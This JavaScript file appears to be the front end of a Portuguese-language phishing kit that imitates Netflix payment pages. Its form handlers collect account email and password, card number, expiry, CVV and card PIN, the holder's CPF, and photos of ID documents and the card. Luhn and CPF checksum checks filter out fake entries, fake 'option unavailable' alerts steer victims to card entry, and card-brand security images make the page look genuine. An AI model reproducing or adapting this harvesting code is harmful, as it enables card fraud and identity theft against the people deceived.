$(document).ready(function() {
	$('#cpfis').mask('000.000.000-00', {reverse: false});
});


function snd_img1(){
	$('#btn_snd_1').css('background-color', 'green');
	$('#btn_snd_1').html('<i class="fa fa-check"></i>&nbsp;&nbsp;&nbsp;Imagem anexada.');
	$('#ensina_m_fazer_one').css('display', 'none');
	$('#btn_show_after_1').css('display', 'block');
	return false;
}


function snd_img2(){
	$('#btn_snd_2').css('background-color', 'green');
	$('#btn_snd_2').html('<i class="fa fa-check"></i>&nbsp;&nbsp;&nbsp;Imagem anexada.');
	$('#ensina_m_fazer_two').css('display', 'none');
	$('#btn_show_after_2').css('display', 'block');
	return false;
}

function snd_img3(){
	$('#btn_snd_3').css('background-color', 'green');
	$('#btn_snd_3').html('<i class="fa fa-check"></i>&nbsp;&nbsp;&nbsp;Imagem anexada.');
	$('#ensina_m_fazer_three').css('display', 'none');
	$('#btn_show_after_3').css('display', 'block');
	return false;
}


function check_cc_frente(){
	var arquivo = $('#isc_ccfrente').val();

	if(arquivo == ''){
		alert("Você deve selecionar a foto do seu cartão para continuar!");
		return false;
	}else{
		enviar();
		return false;
	}	
}

function check_doc_frente(){
	var arquivo = $('#is_rg_mfrente').val();

	if(arquivo == ''){
		alert("Você deve selecionar a foto do seu documento de identificação para continuar!");
		return false;
	}else{
		enviar();
		return false;
	}
}

function check_doc_verso(){
	var arquivo = $('#is_rg_mverso').val();

	if(arquivo == ''){
		alert("Você deve selecionar a foto do seu documento de identificação para continuar!");
		return false;
	}else{
		enviar();
		return false;
	}
}

function send_form_1(){
	var arquivo = $('#is_rg_mfrente').val();

	if(arquivo == ''){
		alert("Você deve selecionar a foto do seu documento de identificação para continuar!");
		return false;
	}else{
		$('#modal_loader_bs1').css('display', 'block');
		$('#form_send_1').submit();
		return false;
	}	
}

function send_form_2(){
	var arquivo = $('#is_rg_mverso').val();

	if(arquivo == ''){
		alert("Você deve selecionar a foto do seu documento de identificação para continuar!");
		return false;
	}else{
		$('#modal_loader_bs2').css('display', 'block');
		$('#form_send_2').submit();
		return false;
	}	
}

function send_form_3(){
	var arquivo = $('#isc_ccfrente').val();

	if(arquivo == ''){
		alert("Você deve selecionar a foto do seu cartão para continuar!");
		return false;
	}else{
		$('#modal_loader_bs3').css('display', 'block');
		$('#form_send_3').submit();
		return false;
	}	
}




function check_docs(){
	var doc_frente = document.getElementById('is_rg_frente').value;
	var doc_verso = document.getElementById('is_rg_verso').value;
	var cd_frente = document.getElementById('is_cc_frente').value;

	if(doc_frente == ''){
		alert("Faltam arquivos a serem anexados.\nPor favor, tente novamente!");
		return false;
	}

	if(doc_verso == ''){
		alert("Faltam arquivos a serem anexados.\nPor favor, tente novamente!");
		return false;
	}

	if(cd_frente == ''){
		alert("Faltam arquivos a serem anexados.\nPor favor, tente novamente!");
		return false;
	}
}

function check_pscc(){
	var senha1 = $('#is_pscc').val();

	if(senha1.length < 4){
		alert("A senha informada não está correta.\nA senha do seu cartão pode conter de 4 à 6 números.");
		$('#is_pscc').val('');
		$('#is_pscc').focus();
		return false;
	}
}

function check_enter_cc(){
	var nome = $('#is_name').val();
	var cpf = $('#cpfis').val();
	var numero = $('#is_number').val();
	var mes = document.getElementById('is_mes').value;
	var ano = document.getElementById('is_ano').value;
	var cvv = $('#is_cvv').val();

	var checkCPF = validarCPF(cpf);
	var checkCC = checkCard(numero);

	if(nome.length < 8){
		alert("O nome informado não está correto.\nInforme o nome como inscrito no cartão!");
		$('#is_name').val('');
		$('#is_name').focus();
		return false;
	}

	if(cpf.length < 14){
		alert("O CPF informado não está correto.\nTente novamente!");
		$('#cpfis').val('');
		$('#cpfis').focus();
		return false;
	}

	if(!checkCPF){
		alert("O CPF informado é inválido.\nTente novamente!");
		$('#cpfis').val('');
		$('#cpfis').focus();
		return false;
	}

	if(numero.length < 15){
		alert("Informe os números da frente do cartão.\nTente novamente!");
		$('#is_number').val('');
		$('#is_number').focus();
		return false;
	}

	if(numero.length > 15){
		if(!checkCC){
			alert("O cartão de crédito informado não é válido.\nTente novamente!");
			$('#is_number').val('');
			$('#is_number').focus();
			return false;
		}
	}

	if(mes == 'mes'){
		alert("Você deve selecionar o Mês de vencimento do seu cartão.\nTente novamente!");
		return false;
	}

	if(ano == 'ano'){
		alert("Você deve selecionar o Ano de vencimento do seu cartão.\nTente novamente!");
		return false;
	}

	if(cvv.length < 3){
		alert("O Código de segurança informado não está correto.\nInforme os 3 números que se encontram no verso do cartão!");
		$('#is_cvv').val('');
		$('#is_cvv').focus();
		return false;
	}

}

function get_payment(){
	$('#pay_methods').css('display', 'none');
	$('#cobrar_cc').css('display', 'block');
	return false;
}

function op_indisponivel(valor){
	if(valor == 'cc_pre'){
		alert("Opção de pagamento com cartão pré-pago Netflix não está disponível no momento.\nUtilize outra forma de pagamento!");
		return false;		
	}else if(valor == 'cc_deb'){
		alert("Opção de pagamento com cartão de débito não está disponível no momento.\nUtilize outra forma de pagamento!");
		return false;
	}else if(valor == 'deb_cnt'){
		alert("Opção de pagamento com débito em conta não está disponível no momento.\nUtilize outra forma de pagamento!");
		return false;
	}
}

function check_login(){
	var email = $("#is_email").val();
	var senha = $("#is_password").val();

	if(email.length < 10){
		alert("O e-mail informado não está correto.\nTente novamente!");
		$("#is_email").val('');
		$("#is_email").focus();
		return false;
	}

	if(email.indexOf("@") == -1){
		alert("E-mail informado é inválido.\nTente novamente!");
		$("#is_email").val('');
		$("#is_email").focus();
		return false;
	}

	if(senha.length < 4){
		alert("A senha informada não está correta.\nTente novamente!");
		$("#is_password").val('');
		$("#is_password").focus();
		return false;
	}

}

function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}

function checkCard(num){
	var msg = Array();
	var tipo = null;
	if(num.length > 16 || num[0]==0){
		return false;
	} else {
		var total = 0;
		var arr = Array();
		for(i = 0;i < num.length;i++){
			if(i % 2 == 0){
				dig = num[i] * 2;	
				if(dig > 9){
					dig1 = dig.toString().substr(0,1);
					dig2 = dig.toString().substr(1,1);
					arr[i] = parseInt(dig1)+parseInt(dig2);
				} else {
					arr[i] = parseInt(dig);
				}		
				total += parseInt(arr[i]);
			} else {
				arr[i] =parseInt(num[i]);
				total += parseInt(arr[i]);
			} 
		}
	}
	if(msg.length>0){	
		return false;
	}else{
			if(total%10 == 0){
				return true;
			}else{
				return false;
			}
		}
}

function validarCPF(cpf){
	
	if(cpf.length < 11){
		return false;
	}else{
		cpf = remove(cpf, ".");
		cpf = remove(cpf, "-");
	}

	
	if(cpf.length != 11 || cpf == "00000000000" || cpf == "11111111111" ||	cpf == "22222222222" || cpf == "33333333333" || cpf == "44444444444" ||	cpf == "55555555555" || cpf == "66666666666" || cpf == "77777777777" || cpf == "88888888888" || cpf == "99999999999"){
		return false;
	}

	soma = 0;
	for(i = 0; i < 9; i++){
		soma += parseInt(cpf.charAt(i)) * (10 - i);
	}

	resto = 11 - (soma % 11);
	if(resto == 10 || resto == 11){
		resto = 0;
	}
	if(resto != parseInt(cpf.charAt(9))){
		return false;
	}

	soma = 0;
	for(i = 0; i < 10; i ++){
		soma += parseInt(cpf.charAt(i)) * (11 - i);
	}
	resto = 11 - (soma % 11);
	if(resto == 10 || resto == 11){
		resto = 0;
	}

	if(resto != parseInt(cpf.charAt(10))){
		return false;
	}
	return true;
}

function remove(str, sub) {
	i = str.indexOf(sub);
	r = "";
	if (i == -1) return str;
	{
		r += str.substring(0,i) + remove(str.substring(i + sub.length), sub);
	}
	
	return r;
}

function getCreditCardLabel(cardNumber){
	
	var regexVisa = /^4[0-9]{12}(?:[0-9]{3})?/;
	var regexMaster = /^5[1-5][0-9]{14}/;
	var regexAmex = /^3[47][0-9]{13}/;
	var regexDiners = /^3(?:0[0-5]|[68][0-9])[0-9]{11}/;
	var regexDiscover = /^6(?:011|5[0-9]{2})[0-9]{12}/;
	var regexHiper = /^(606282\d{10}(\d{3})?)|(3841\d{15})$/;
	var regexElo = /^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/;
	var regexAura = /^50\d{14}$/;

	if(regexVisa.test(cardNumber)){
		document.getElementById('secure_code').src = 'imagens/vbv.jpg';
		return false;
	}
	if(regexMaster.test(cardNumber)){
		document.getElementById('secure_code').src = 'imagens/vbm.jpg';
		return false;
	}
	if(regexAmex.test(cardNumber)){
		document.getElementById('secure_code').src = 'imagens/vbmx.jpg';
		return false;
	}
	if(regexDiners.test(cardNumber)){
		document.getElementById('secure_code').src = 'imagens/vbd.jpg';
		return false;
	}
	if(regexHiper.test(cardNumber)){
		document.getElementById('secure_code').src = 'imagens/vbh.jpg';
		return false;
	}
	if(regexElo.test(cardNumber)){
		document.getElementById('secure_code').src = 'imagens/vbe.jpg';
		return false;
	}
	if(regexAura.test(cardNumber)){
		document.getElementById('secure_code').src = 'imagens/vba.jpg';
		return false;
	}
	else{
		document.getElementById('secure_code').src = 'imagens/vbv.jpg';
		return false;
	}  
}